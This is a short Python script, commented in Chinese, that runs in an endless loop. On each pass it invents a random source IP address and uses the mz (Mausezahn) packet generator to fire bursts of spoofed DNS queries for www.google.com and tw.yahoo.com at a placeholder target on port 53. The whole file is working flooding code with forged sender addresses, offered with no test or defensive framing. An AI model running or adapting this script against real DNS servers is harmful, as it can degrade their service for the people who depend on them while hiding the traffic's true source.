import random
import time
import os

while True:
    ip = f"{random.randint(0, 253)}.{random.randint(0, 253)}.{random.randint(0, 253)}.{random.randint(0, 253)}"
    sp = random.randint(1024, 62535)
    fram1 = random.randint(1, 13)
    fram2 = random.randint(1, 19)
    Lp1 = random.randint(1, 2)
    Lp2 = random.randint(1, 2)

    # 使用批量處理來減少系統調用次數
    cmd1 = f"mz -c {fram1} -B TargetIP -A {ip} -t dns 'sp={sp},dp=53,q=www.google.com' -d 900u"
    cmd2 = f"mz -c {fram2} -B TargetIP -A {ip} -t dns 'sp={sp},dp=53,q=tw.yahoo.com' -d 700u"

    os.system(f"{cmd1} & {cmd2}")
    
    # Lp1次數的google.com
    for _ in range(Lp1):
        os.system(cmd1)
    
    # 1秒延遲
    time.sleep(1)
    
    # Lp2次數的yahoo.com
    for _ in range(Lp2):
        os.system(cmd2)
